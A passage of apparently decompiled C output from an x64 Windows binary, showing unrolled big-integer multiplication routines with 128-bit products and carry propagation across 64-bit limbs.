  v667 = *((_QWORD *)&v665 + 1) + v663;
  v668 = (v667 < *((_QWORD *)&v665 + 1)) + v664;
  v669 = v3[9] * (unsigned __int128)v4[9];
  v670 = v666 + v669;
  *((_QWORD *)&v669 + 1) += v666 + (unsigned __int64)v669 < v666;
  v671 = *((_QWORD *)&v669 + 1) + v667;
  v672 = (v671 < *((_QWORD *)&v669 + 1)) + v668;
  v673 = v3[10] * (unsigned __int128)v4[8];
  v674 = v670 + v673;
  *((_QWORD *)&v673 + 1) += v670 + (unsigned __int64)v673 < v670;
  v675 = *((_QWORD *)&v673 + 1) + v671;
  v676 = (v675 < *((_QWORD *)&v673 + 1)) + v672;
  v677 = v3[11] * (unsigned __int128)v4[7];
  v678 = v674 + v677;
  *((_QWORD *)&v677 + 1) += v674 + (unsigned __int64)v677 < v674;
  v679 = *((_QWORD *)&v677 + 1) + v675;
  v680 = (v679 < *((_QWORD *)&v677 + 1)) + v676;
  v681 = v3[12] * (unsigned __int128)v4[6];
  v682 = v678 + v681;
  *((_QWORD *)&v681 + 1) += v678 + (unsigned __int64)v681 < v678;
  v683 = *((_QWORD *)&v681 + 1) + v679;
  v684 = (v683 < *((_QWORD *)&v681 + 1)) + v680;
  v685 = v3[13] * (unsigned __int128)v4[5];
  v686 = v682 + v685;
  *((_QWORD *)&v685 + 1) += v682 + (unsigned __int64)v685 < v682;
  v687 = *((_QWORD *)&v685 + 1) + v683;
  v688 = (v687 < *((_QWORD *)&v685 + 1)) + v684;
  v689 = v3[14] * (unsigned __int128)v4[4];
  v690 = v686 + v689;
  *((_QWORD *)&v689 + 1) += v686 + (unsigned __int64)v689 < v686;
  v691 = *((_QWORD *)&v689 + 1) + v687;
  v692 = (v691 < *((_QWORD *)&v689 + 1)) + v688;
  v693 = v3[15] * (unsigned __int128)v4[3];
  *(_QWORD *)&v693 = v690 + v693;
  v5[18] = v693;
  *((_QWORD *)&v693 + 1) += (unsigned __int64)v693 < v690;
  v694 = *((_QWORD *)&v693 + 1) + v691;
  v695 = (v694 < *((_QWORD *)&v693 + 1)) + v692;
  v696 = v3[4] * (unsigned __int128)v4[15];
  v697 = v694 + v696;
  *((_QWORD *)&v696 + 1) += v694 + (unsigned __int64)v696 < v694;
  v698 = *((_QWORD *)&v696 + 1) + v695;
  v699 = v698 < *((_QWORD *)&v696 + 1);
  v700 = v3[5] * (unsigned __int128)v4[14];
  v701 = v697 + v700;
  *((_QWORD *)&v700 + 1) += v697 + (unsigned __int64)v700 < v697;
  v702 = *((_QWORD *)&v700 + 1) + v698;
  v703 = (v702 < *((_QWORD *)&v700 + 1)) + v699;
  v704 = v3[6] * (unsigned __int128)v4[13];
  v705 = v701 + v704;
  *((_QWORD *)&v704 + 1) += v701 + (unsigned __int64)v704 < v701;
  v706 = *((_QWORD *)&v704 + 1) + v702;
  v707 = (v706 < *((_QWORD *)&v704 + 1)) + v703;
  v708 = v3[7] * (unsigned __int128)v4[12];
  v709 = v705 + v708;
  *((_QWORD *)&v708 + 1) += v705 + (unsigned __int64)v708 < v705;
  v710 = *((_QWORD *)&v708 + 1) + v706;
  v711 = (v710 < *((_QWORD *)&v708 + 1)) + v707;
  v712 = v3[8] * (unsigned __int128)v4[11];
  v713 = v709 + v712;
  *((_QWORD *)&v712 + 1) += v709 + (unsigned __int64)v712 < v709;
  v714 = *((_QWORD *)&v712 + 1) + v710;
  v715 = (v714 < *((_QWORD *)&v712 + 1)) + v711;
  v716 = v3[9] * (unsigned __int128)v4[10];
  v717 = v713 + v716;
  *((_QWORD *)&v716 + 1) += v713 + (unsigned __int64)v716 < v713;
  v718 = *((_QWORD *)&v716 + 1) + v714;
  v719 = (v718 < *((_QWORD *)&v716 + 1)) + v715;
  v720 = v3[10] * (unsigned __int128)v4[9];
  v721 = v717 + v720;
  *((_QWORD *)&v720 + 1) += v717 + (unsigned __int64)v720 < v717;
  v722 = *((_QWORD *)&v720 + 1) + v718;
  v723 = (v722 < *((_QWORD *)&v720 + 1)) + v719;
  v724 = v3[11] * (unsigned __int128)v4[8];
  v725 = v721 + v724;
  *((_QWORD *)&v724 + 1) += v721 + (unsigned __int64)v724 < v721;
  v726 = *((_QWORD *)&v724 + 1) + v722;
  v727 = (v726 < *((_QWORD *)&v724 + 1)) + v723;
  v728 = v3[12] * (unsigned __int128)v4[7];
  v729 = v725 + v728;
  *((_QWORD *)&v728 + 1) += v725 + (unsigned __int64)v728 < v725;
  v730 = *((_QWORD *)&v728 + 1) + v726;
  v731 = (v730 < *((_QWORD *)&v728 + 1)) + v727;
  v732 = v3[13] * (unsigned __int128)v4[6];
  v733 = v729 + v732;
  *((_QWORD *)&v732 + 1) += v729 + (unsigned __int64)v732 < v729;
  v734 = *((_QWORD *)&v732 + 1) + v730;
  v735 = (v734 < *((_QWORD *)&v732 + 1)) + v731;
  v736 = v3[14] * (unsigned __int128)v4[5];
  v737 = v733 + v736;
  *((_QWORD *)&v736 + 1) += v733 + (unsigned __int64)v736 < v733;
  v738 = *((_QWORD *)&v736 + 1) + v734;
  v739 = (v738 < *((_QWORD *)&v736 + 1)) + v735;
  v740 = v3[15] * (unsigned __int128)v4[4];
  *(_QWORD *)&v740 = v737 + v740;
  v5[19] = v740;
  *((_QWORD *)&v740 + 1) += (unsigned __int64)v740 < v737;
  v741 = *((_QWORD *)&v740 + 1) + v738;
  v742 = (v741 < *((_QWORD *)&v740 + 1)) + v739;
  v743 = v3[5] * (unsigned __int128)v4[15];
  v744 = v741 + v743;
  *((_QWORD *)&v743 + 1) += v741 + (unsigned __int64)v743 < v741;
  v745 = *((_QWORD *)&v743 + 1) + v742;
  v746 = v745 < *((_QWORD *)&v743 + 1);
  v747 = v3[6] * (unsigned __int128)v4[14];
  v748 = v744 + v747;
  *((_QWORD *)&v747 + 1) += v744 + (unsigned __int64)v747 < v744;
  v749 = *((_QWORD *)&v747 + 1) + v745;
  v750 = (v749 < *((_QWORD *)&v747 + 1)) + v746;
  v751 = v3[7] * (unsigned __int128)v4[13];
  v752 = v748 + v751;
  *((_QWORD *)&v751 + 1) += v748 + (unsigned __int64)v751 < v748;
  v753 = *((_QWORD *)&v751 + 1) + v749;
  v754 = (v753 < *((_QWORD *)&v751 + 1)) + v750;
  v755 = v3[8] * (unsigned __int128)v4[12];
  v756 = v752 + v755;
  *((_QWORD *)&v755 + 1) += v752 + (unsigned __int64)v755 < v752;
  v757 = *((_QWORD *)&v755 + 1) + v753;
  v758 = (v757 < *((_QWORD *)&v755 + 1)) + v754;
  v759 = v3[9] * (unsigned __int128)v4[11];
  v760 = v756 + v759;
  *((_QWORD *)&v759 + 1) += v756 + (unsigned __int64)v759 < v756;
  v761 = *((_QWORD *)&v759 + 1) + v757;
  v762 = (v761 < *((_QWORD *)&v759 + 1)) + v758;
  v763 = v3[10] * (unsigned __int128)v4[10];
  v764 = v760 + v763;
  *((_QWORD *)&v763 + 1) += v760 + (unsigned __int64)v763 < v760;
  v765 = *((_QWORD *)&v763 + 1) + v761;
  v766 = (v765 < *((_QWORD *)&v763 + 1)) + v762;
  v767 = v3[11] * (unsigned __int128)v4[9];
  v768 = v764 + v767;
  *((_QWORD *)&v767 + 1) += v764 + (unsigned __int64)v767 < v764;
  v769 = *((_QWORD *)&v767 + 1) + v765;
  v770 = (v769 < *((_QWORD *)&v767 + 1)) + v766;
  v771 = v3[12] * (unsigned __int128)v4[8];
  v772 = v768 + v771;
  *((_QWORD *)&v771 + 1) += v768 + (unsigned __int64)v771 < v768;
  v773 = *((_QWORD *)&v771 + 1) + v769;
  v774 = (v773 < *((_QWORD *)&v771 + 1)) + v770;
  v775 = v3[13] * (unsigned __int128)v4[7];
  v776 = v772 + v775;
  *((_QWORD *)&v775 + 1) += v772 + (unsigned __int64)v775 < v772;
  v777 = *((_QWORD *)&v775 + 1) + v773;
  v778 = (v777 < *((_QWORD *)&v775 + 1)) + v774;
  v779 = v3[14] * (unsigned __int128)v4[6];
  v780 = v776 + v779;
  *((_QWORD *)&v779 + 1) += v776 + (unsigned __int64)v779 < v776;
  v781 = *((_QWORD *)&v779 + 1) + v777;
  v782 = (v781 < *((_QWORD *)&v779 + 1)) + v778;
  v783 = v3[15] * (unsigned __int128)v4[5];
  *(_QWORD *)&v783 = v780 + v783;
  v5[20] = v783;
  *((_QWORD *)&v783 + 1) += (unsigned __int64)v783 < v780;
  v784 = *((_QWORD *)&v783 + 1) + v781;
  v785 = (v784 < *((_QWORD *)&v783 + 1)) + v782;
  v786 = v3[6] * (unsigned __int128)v4[15];
  v787 = v784 + v786;
  *((_QWORD *)&v786 + 1) += v784 + (unsigned __int64)v786 < v784;
  v788 = *((_QWORD *)&v786 + 1) + v785;
  v789 = v788 < *((_QWORD *)&v786 + 1);
  v790 = v3[7] * (unsigned __int128)v4[14];
  v791 = v787 + v790;
  *((_QWORD *)&v790 + 1) += v787 + (unsigned __int64)v790 < v787;
  v792 = *((_QWORD *)&v790 + 1) + v788;
  v793 = (v792 < *((_QWORD *)&v790 + 1)) + v789;
  v794 = v3[8] * (unsigned __int128)v4[13];
  v795 = v791 + v794;
  *((_QWORD *)&v794 + 1) += v791 + (unsigned __int64)v794 < v791;
  v796 = *((_QWORD *)&v794 + 1) + v792;
  v797 = (v796 < *((_QWORD *)&v794 + 1)) + v793;
  v798 = v3[9] * (unsigned __int128)v4[12];
  v799 = v795 + v798;
  *((_QWORD *)&v798 + 1) += v795 + (unsigned __int64)v798 < v795;
  v800 = *((_QWORD *)&v798 + 1) + v796;
  v801 = (v800 < *((_QWORD *)&v798 + 1)) + v797;
  v802 = v3[10] * (unsigned __int128)v4[11];
  v803 = v799 + v802;
  *((_QWORD *)&v802 + 1) += v799 + (unsigned __int64)v802 < v799;
  v804 = *((_QWORD *)&v802 + 1) + v800;
  v805 = (v804 < *((_QWORD *)&v802 + 1)) + v801;
  v806 = v3[11] * (unsigned __int128)v4[10];
  v807 = v803 + v806;
  *((_QWORD *)&v806 + 1) += v803 + (unsigned __int64)v806 < v803;
  v808 = *((_QWORD *)&v806 + 1) + v804;
  v809 = (v808 < *((_QWORD *)&v806 + 1)) + v805;
  v810 = v3[12] * (unsigned __int128)v4[9];
  v811 = v807 + v810;
  *((_QWORD *)&v810 + 1) += v807 + (unsigned __int64)v810 < v807;
  v812 = *((_QWORD *)&v810 + 1) + v808;
  v813 = (v812 < *((_QWORD *)&v810 + 1)) + v809;
  v814 = v3[13] * (unsigned __int128)v4[8];
  v815 = v811 + v814;
  *((_QWORD *)&v814 + 1) += v811 + (unsigned __int64)v814 < v811;
  v816 = *((_QWORD *)&v814 + 1) + v812;
  v817 = (v816 < *((_QWORD *)&v814 + 1)) + v813;
  v818 = v3[14] * (unsigned __int128)v4[7];
  v819 = v815 + v818;
  *((_QWORD *)&v818 + 1) += v815 + (unsigned __int64)v818 < v815;
  v820 = *((_QWORD *)&v818 + 1) + v816;
  v821 = (v820 < *((_QWORD *)&v818 + 1)) + v817;
  v822 = v3[15] * (unsigned __int128)v4[6];
  *(_QWORD *)&v822 = v819 + v822;
  v5[21] = v822;
  *((_QWORD *)&v822 + 1) += (unsigned __int64)v822 < v819;
  v823 = *((_QWORD *)&v822 + 1) + v820;
  v824 = (v823 < *((_QWORD *)&v822 + 1)) + v821;
  v825 = v3[7] * (unsigned __int128)v4[15];
  v826 = v823 + v825;
  *((_QWORD *)&v825 + 1) += v823 + (unsigned __int64)v825 < v823;
  v827 = *((_QWORD *)&v825 + 1) + v824;
  v828 = v827 < *((_QWORD *)&v825 + 1);
  v829 = v3[8] * (unsigned __int128)v4[14];
  v830 = v826 + v829;
  *((_QWORD *)&v829 + 1) += v826 + (unsigned __int64)v829 < v826;
  v831 = *((_QWORD *)&v829 + 1) + v827;
  v832 = (v831 < *((_QWORD *)&v829 + 1)) + v828;
  v833 = v3[9] * (unsigned __int128)v4[13];
  v834 = v830 + v833;
  *((_QWORD *)&v833 + 1) += v830 + (unsigned __int64)v833 < v830;
  v835 = *((_QWORD *)&v833 + 1) + v831;
  v836 = (v835 < *((_QWORD *)&v833 + 1)) + v832;
  v837 = v3[10] * (unsigned __int128)v4[12];
  v838 = v834 + v837;
  *((_QWORD *)&v837 + 1) += v834 + (unsigned __int64)v837 < v834;
  v839 = *((_QWORD *)&v837 + 1) + v835;
  v840 = (v839 < *((_QWORD *)&v837 + 1)) + v836;
  v841 = v3[11] * (unsigned __int128)v4[11];
  v842 = v838 + v841;
  *((_QWORD *)&v841 + 1) += v838 + (unsigned __int64)v841 < v838;
  v843 = *((_QWORD *)&v841 + 1) + v839;
  v844 = (v843 < *((_QWORD *)&v841 + 1)) + v840;
  v845 = v3[12] * (unsigned __int128)v4[10];
  v846 = v842 + v845;
  *((_QWORD *)&v845 + 1) += v842 + (unsigned __int64)v845 < v842;
  v847 = *((_QWORD *)&v845 + 1) + v843;
  v848 = (v847 < *((_QWORD *)&v845 + 1)) + v844;
  v849 = v3[13] * (unsigned __int128)v4[9];
  v850 = v846 + v849;
  *((_QWORD *)&v849 + 1) += v846 + (unsigned __int64)v849 < v846;
  v851 = *((_QWORD *)&v849 + 1) + v847;
  v852 = (v851 < *((_QWORD *)&v849 + 1)) + v848;
  v853 = v3[14] * (unsigned __int128)v4[8];
  v854 = v850 + v853;
  *((_QWORD *)&v853 + 1) += v850 + (unsigned __int64)v853 < v850;
  v855 = *((_QWORD *)&v853 + 1) + v851;
  v856 = (v855 < *((_QWORD *)&v853 + 1)) + v852;
  v857 = v3[15] * (unsigned __int128)v4[7];
  *(_QWORD *)&v857 = v854 + v857;
  v5[22] = v857;
  *((_QWORD *)&v857 + 1) += (unsigned __int64)v857 < v854;
  v858 = *((_QWORD *)&v857 + 1) + v855;
  v859 = (v858 < *((_QWORD *)&v857 + 1)) + v856;
  v860 = v3[8] * (unsigned __int128)v4[15];
  v861 = v858 + v860;
  *((_QWORD *)&v860 + 1) += v858 + (unsigned __int64)v860 < v858;
  v862 = *((_QWORD *)&v860 + 1) + v859;
  v863 = v862 < *((_QWORD *)&v860 + 1);
  v864 = v3[9] * (unsigned __int128)v4[14];
  v865 = v861 + v864;
  *((_QWORD *)&v864 + 1) += v861 + (unsigned __int64)v864 < v861;
  v866 = *((_QWORD *)&v864 + 1) + v862;
  v867 = (v866 < *((_QWORD *)&v864 + 1)) + v863;
  v868 = v3[10] * (unsigned __int128)v4[13];
  v869 = v865 + v868;
  *((_QWORD *)&v868 + 1) += v865 + (unsigned __int64)v868 < v865;
  v870 = *((_QWORD *)&v868 + 1) + v866;
  v871 = (v870 < *((_QWORD *)&v868 + 1)) + v867;
  v872 = v3[11] * (unsigned __int128)v4[12];
  v873 = v869 + v872;
  *((_QWORD *)&v872 + 1) += v869 + (unsigned __int64)v872 < v869;
  v874 = *((_QWORD *)&v872 + 1) + v870;
  v875 = (v874 < *((_QWORD *)&v872 + 1)) + v871;
  v876 = v3[12] * (unsigned __int128)v4[11];
  v877 = v873 + v876;
  *((_QWORD *)&v876 + 1) += v873 + (unsigned __int64)v876 < v873;
  v878 = *((_QWORD *)&v876 + 1) + v874;
  v879 = (v878 < *((_QWORD *)&v876 + 1)) + v875;
  v880 = v3[13] * (unsigned __int128)v4[10];
  v881 = v877 + v880;
  *((_QWORD *)&v880 + 1) += v877 + (unsigned __int64)v880 < v877;
  v882 = *((_QWORD *)&v880 + 1) + v878;
  v883 = (v882 < *((_QWORD *)&v880 + 1)) + v879;
  v884 = v3[14] * (unsigned __int128)v4[9];
  v885 = v881 + v884;
  *((_QWORD *)&v884 + 1) += v881 + (unsigned __int64)v884 < v881;
  v886 = *((_QWORD *)&v884 + 1) + v882;
  v887 = (v886 < *((_QWORD *)&v884 + 1)) + v883;
  v888 = v3[15] * (unsigned __int128)v4[8];
  *(_QWORD *)&v888 = v885 + v888;
  *((_QWORD *)&v888 + 1) += (unsigned __int64)v888 < v885;
  v889 = *((_QWORD *)&v888 + 1) + v886;
  v5[23] = v888;
  v890 = (v889 < *((_QWORD *)&v888 + 1)) + v887;
  v891 = v3[9] * (unsigned __int128)v4[15];
  v892 = v889 + v891;
  *((_QWORD *)&v891 + 1) += v889 + (unsigned __int64)v891 < v889;
  v893 = *((_QWORD *)&v891 + 1) + v890;
  v894 = v893 < *((_QWORD *)&v891 + 1);
  v895 = v3[10] * (unsigned __int128)v4[14];
  v896 = v892 + v895;
  *((_QWORD *)&v895 + 1) += v892 + (unsigned __int64)v895 < v892;
  v897 = *((_QWORD *)&v895 + 1) + v893;
  v898 = (v897 < *((_QWORD *)&v895 + 1)) + v894;
  v899 = v3[11] * (unsigned __int128)v4[13];
  v900 = v896 + v899;
  *((_QWORD *)&v899 + 1) += v896 + (unsigned __int64)v899 < v896;
  v901 = *((_QWORD *)&v899 + 1) + v897;
  v902 = (v901 < *((_QWORD *)&v899 + 1)) + v898;
  v903 = v3[12] * (unsigned __int128)v4[12];
  v904 = v900 + v903;
  *((_QWORD *)&v903 + 1) += v900 + (unsigned __int64)v903 < v900;
  v905 = *((_QWORD *)&v903 + 1) + v901;
  v906 = (v905 < *((_QWORD *)&v903 + 1)) + v902;
  v907 = v3[13] * (unsigned __int128)v4[11];
  v908 = v904 + v907;
  *((_QWORD *)&v907 + 1) += v904 + (unsigned __int64)v907 < v904;
  v909 = *((_QWORD *)&v907 + 1) + v905;
  v910 = (v909 < *((_QWORD *)&v907 + 1)) + v906;
  v911 = v3[14] * (unsigned __int128)v4[10];
  v912 = v908 + v911;
  *((_QWORD *)&v911 + 1) += v908 + (unsigned __int64)v911 < v908;
  v913 = *((_QWORD *)&v911 + 1) + v909;
  v914 = (v913 < *((_QWORD *)&v911 + 1)) + v910;
  v915 = v3[15] * (unsigned __int128)v4[9];
  *(_QWORD *)&v915 = v912 + v915;
  v5[24] = v915;
  *((_QWORD *)&v915 + 1) += (unsigned __int64)v915 < v912;
  v916 = *((_QWORD *)&v915 + 1) + v913;
  v917 = (v916 < *((_QWORD *)&v915 + 1)) + v914;
  v918 = v3[10] * (unsigned __int128)v4[15];
  v919 = v916 + v918;
  *((_QWORD *)&v918 + 1) += v916 + (unsigned __int64)v918 < v916;
  v920 = *((_QWORD *)&v918 + 1) + v917;
  v921 = v920 < *((_QWORD *)&v918 + 1);
  v922 = v3[11] * (unsigned __int128)v4[14];
  v923 = v919 + v922;
  *((_QWORD *)&v922 + 1) += v919 + (unsigned __int64)v922 < v919;
  v924 = *((_QWORD *)&v922 + 1) + v920;
  v925 = (v924 < *((_QWORD *)&v922 + 1)) + v921;
  v926 = v3[12] * (unsigned __int128)v4[13];
  v927 = v923 + v926;
  *((_QWORD *)&v926 + 1) += v923 + (unsigned __int64)v926 < v923;
  v928 = *((_QWORD *)&v926 + 1) + v924;
  v929 = (v928 < *((_QWORD *)&v926 + 1)) + v925;
  v930 = v3[13] * (unsigned __int128)v4[12];
  v931 = v927 + v930;
  *((_QWORD *)&v930 + 1) += v927 + (unsigned __int64)v930 < v927;
  v932 = *((_QWORD *)&v930 + 1) + v928;
  v933 = (v932 < *((_QWORD *)&v930 + 1)) + v929;
  v934 = v3[14] * (unsigned __int128)v4[11];
  v935 = v931 + v934;
  *((_QWORD *)&v934 + 1) += v931 + (unsigned __int64)v934 < v931;
  v936 = *((_QWORD *)&v934 + 1) + v932;
  v937 = (v936 < *((_QWORD *)&v934 + 1)) + v933;
  v938 = v3[15] * (unsigned __int128)v4[10];
  *(_QWORD *)&v938 = v935 + v938;
  v5[25] = v938;
  *((_QWORD *)&v938 + 1) += (unsigned __int64)v938 < v935;
  v939 = *((_QWORD *)&v938 + 1) + v936;
  v940 = (v939 < *((_QWORD *)&v938 + 1)) + v937;
  v941 = v3[11] * (unsigned __int128)v4[15];
  v942 = v939 + v941;
  *((_QWORD *)&v941 + 1) += v939 + (unsigned __int64)v941 < v939;
  v943 = *((_QWORD *)&v941 + 1) + v940;
  v944 = v943 < *((_QWORD *)&v941 + 1);
  v945 = v3[12] * (unsigned __int128)v4[14];
  v946 = v942 + v945;
  *((_QWORD *)&v945 + 1) += v942 + (unsigned __int64)v945 < v942;
  v947 = *((_QWORD *)&v945 + 1) + v943;
  v948 = (v947 < *((_QWORD *)&v945 + 1)) + v944;
  v949 = v3[13] * (unsigned __int128)v4[13];
  v950 = v946 + v949;
  *((_QWORD *)&v949 + 1) += v946 + (unsigned __int64)v949 < v946;
  v951 = *((_QWORD *)&v949 + 1) + v947;
  v952 = (v951 < *((_QWORD *)&v949 + 1)) + v948;
  v953 = v3[14] * (unsigned __int128)v4[12];
  v954 = v950 + v953;
  *((_QWORD *)&v953 + 1) += v950 + (unsigned __int64)v953 < v950;
  v955 = *((_QWORD *)&v953 + 1) + v951;
  v956 = (v955 < *((_QWORD *)&v953 + 1)) + v952;
  v957 = v3[15] * (unsigned __int128)v4[11];
  *(_QWORD *)&v957 = v954 + v957;
  v5[26] = v957;
  *((_QWORD *)&v957 + 1) += (unsigned __int64)v957 < v954;
  v958 = *((_QWORD *)&v957 + 1) + v955;
  v959 = (v958 < *((_QWORD *)&v957 + 1)) + v956;
  v960 = v3[12] * (unsigned __int128)v4[15];
  v961 = v958 + v960;
  *((_QWORD *)&v960 + 1) += v958 + (unsigned __int64)v960 < v958;
  v962 = *((_QWORD *)&v960 + 1) + v959;
  v963 = v962 < *((_QWORD *)&v960 + 1);
  v964 = v3[13] * (unsigned __int128)v4[14];
  v965 = v961 + v964;
  *((_QWORD *)&v964 + 1) += v961 + (unsigned __int64)v964 < v961;
  v966 = *((_QWORD *)&v964 + 1) + v962;
  v967 = (v966 < *((_QWORD *)&v964 + 1)) + v963;
  v968 = v3[14] * (unsigned __int128)v4[13];
  v969 = v965 + v968;
  *((_QWORD *)&v968 + 1) += v965 + (unsigned __int64)v968 < v965;
  v970 = *((_QWORD *)&v968 + 1) + v966;
  v971 = (v970 < *((_QWORD *)&v968 + 1)) + v967;
  v972 = v3[15] * (unsigned __int128)v4[12];
  *(_QWORD *)&v972 = v969 + v972;
  v5[27] = v972;
  *((_QWORD *)&v972 + 1) += (unsigned __int64)v972 < v969;
  v973 = *((_QWORD *)&v972 + 1) + v970;
  v974 = (v973 < *((_QWORD *)&v972 + 1)) + v971;
  v975 = v3[13] * (unsigned __int128)v4[15];
  v976 = v973 + v975;
  *((_QWORD *)&v975 + 1) += v973 + (unsigned __int64)v975 < v973;
  v977 = *((_QWORD *)&v975 + 1) + v974;
  v978 = v977 < *((_QWORD *)&v975 + 1);
  v979 = v3[14] * (unsigned __int128)v4[14];
  v980 = v976 + v979;
  *((_QWORD *)&v979 + 1) += v976 + (unsigned __int64)v979 < v976;
  v981 = *((_QWORD *)&v979 + 1) + v977;
  v982 = (v981 < *((_QWORD *)&v979 + 1)) + v978;
  v983 = v3[15] * (unsigned __int128)v4[13];
  *(_QWORD *)&v983 = v980 + v983;
  v5[28] = v983;
  *((_QWORD *)&v983 + 1) += (unsigned __int64)v983 < v980;
  v984 = *((_QWORD *)&v983 + 1) + v981;
  v985 = (v984 < *((_QWORD *)&v983 + 1)) + v982;
  v986 = v3[14] * (unsigned __int128)v4[15];
  v987 = v984 + v986;
  *((_QWORD *)&v986 + 1) += v984 + (unsigned __int64)v986 < v984;
  v988 = *((_QWORD *)&v986 + 1) + v985;
  v989 = v988 < *((_QWORD *)&v986 + 1);
  v990 = v3[15] * (unsigned __int128)v4[14];
  *(_QWORD *)&v990 = v987 + v990;
  v5[29] = v990;
  *((_QWORD *)&v990 + 1) += (unsigned __int64)v990 < v987;
  v991 = *((_QWORD *)&v990 + 1) + v988;
  v992 = (v991 < *((_QWORD *)&v990 + 1)) + v989;
  v993 = v3[15] * (unsigned __int128)v4[15];
  result = v991 + v993;
  v5[30] = result;
  v5[31] = v992 + (result < v991) + *((_QWORD *)&v993 + 1);
  return result;
}

//----- (0000000140040750) ----------------------------------------------------
unsigned __int64 __fastcall sub_140040750(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // r11
  _QWORD *v4; // rdi
  unsigned __int64 *v5; // rbx
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // rcx
  unsigned __int128 v13; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a1;
  v5 = a3;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v5;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = v3[1] * (unsigned __int128)v5[1];
  result = v11 + v13;
  v4[2] = result;
  v4[3] = v12 + (result < v11) + *((_QWORD *)&v13 + 1);
  return result;
}

//----- (00000001400407D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400407D0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rdi
  unsigned __int64 *v4; // rsi
  _QWORD *v5; // r14
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r9
  _BOOL8 v16; // r11
  unsigned __int128 v17; // ax
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  _BOOL8 v20; // r11
  unsigned __int128 v21; // ax
  unsigned __int64 v22; // r9
  _BOOL8 v23; // r11
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // rcx
  unsigned __int64 v26; // r11
  _BOOL8 v27; // r10
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r11
  _BOOL8 v31; // r10
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r11
  _BOOL8 v35; // r10
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r11
  _BOOL8 v38; // r10
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r10
  _BOOL8 v42; // r9
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // r10
  _BOOL8 v46; // r9
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // r10
  _BOOL8 v49; // r9
  unsigned __int128 v50; // ax
  unsigned __int64 v51; // rcx
  unsigned __int64 v52; // r9
  _BOOL8 v53; // rbx
  unsigned __int128 v54; // ax
  unsigned __int64 v55; // r9
  _BOOL8 v56; // rbx
  unsigned __int128 v57; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = *v3 * (unsigned __int128)v4[2];
  v14 = v11 + v13;
  *((_QWORD *)&v13 + 1) += v11 + (unsigned __int64)v13 < v11;
  v15 = *((_QWORD *)&v13 + 1) + v12;
  v16 = v15 < *((_QWORD *)&v13 + 1);
  v17 = v3[1] * (unsigned __int128)v4[1];
  v18 = v14 + v17;
  *((_QWORD *)&v17 + 1) += v14 + (unsigned __int64)v17 < v14;
  v19 = *((_QWORD *)&v17 + 1) + v15;
  v20 = (v19 < *((_QWORD *)&v17 + 1)) + v16;
  v21 = v3[2] * (unsigned __int128)*v4;
  *(_QWORD *)&v21 = v18 + v21;
  v5[2] = v21;
  *((_QWORD *)&v21 + 1) += (unsigned __int64)v21 < v18;
  v22 = *((_QWORD *)&v21 + 1) + v19;
  v23 = (v22 < *((_QWORD *)&v21 + 1)) + v20;
  v24 = *v3 * (unsigned __int128)v4[3];
  v25 = v22 + v24;
  *((_QWORD *)&v24 + 1) += v22 + (unsigned __int64)v24 < v22;
  v26 = *((_QWORD *)&v24 + 1) + v23;
  v27 = v26 < *((_QWORD *)&v24 + 1);
  v28 = v3[1] * (unsigned __int128)v4[2];
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v3[2] * (unsigned __int128)v4[1];
  v33 = v29 + v32;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v34 = *((_QWORD *)&v32 + 1) + v30;
  v35 = (v34 < *((_QWORD *)&v32 + 1)) + v31;
  v36 = v3[3] * (unsigned __int128)*v4;
  *(_QWORD *)&v36 = v33 + v36;
  *((_QWORD *)&v36 + 1) += (unsigned __int64)v36 < v33;
  v37 = *((_QWORD *)&v36 + 1) + v34;
  v5[3] = v36;
  v38 = (v37 < *((_QWORD *)&v36 + 1)) + v35;
  v39 = v3[1] * (unsigned __int128)v4[3];
  v40 = v37 + v39;
  *((_QWORD *)&v39 + 1) += v37 + (unsigned __int64)v39 < v37;
  v41 = *((_QWORD *)&v39 + 1) + v38;
